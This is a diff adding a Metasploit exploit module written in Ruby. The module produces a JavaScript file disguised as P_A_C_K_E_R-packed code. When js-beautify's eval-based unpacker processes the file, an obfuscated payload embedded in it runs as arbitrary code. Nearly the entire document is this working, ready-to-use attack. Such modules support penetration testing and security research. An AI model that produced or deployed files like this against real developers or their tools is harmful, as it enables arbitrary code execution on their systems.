@@ -1,0 +1,47 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'msf/core/exploit/jsobfu'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::FILEFORMAT
+  include Msf::Exploit::JSObfu
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Javascript Injection for Eval-based Unpackers',
+      'Description'    => %q{
+        This module generates a Javascript file that executes arbitrary code
+        when an eval-based unpacker is run on it. Works against js-beautify's
+        P_A_C_K_E_R unpacker.
+      },
+      'Author'         => [ 'joev' ],
+      'License'        => MSF_LICENSE,
+      'References'  =>
+        [
+        ],
+      'Platform'       => 'nodejs',
+      'Arch'           => ARCH_NODEJS,
+      'Privileged'     => false,
+      'Targets'        =>	[['Automatic', {}]],
+      'DisclosureDate' => 'Feb 18 2015',
+      'DefaultTarget'  => 0))
+
+    register_options([
+      OptString.new('FILENAME', [true, 'The file name.', 'msf.js']),
+      OptString.new('CUSTOM_JS', [false, 'Custom Javascript payload.'])
+    ], self.class)
+  end
+
+  def exploit
+    p = js_obfuscate(datastore['CUSTOM_JS'] || payload.encoded);
+    print_status("Creating '#{datastore['FILENAME']}' file...")
+    file_create("eval(function(p,a,c,k,e,r){}((function(){ #{p} })(),''.split('|'),0,{}))")
+  end
+
+end
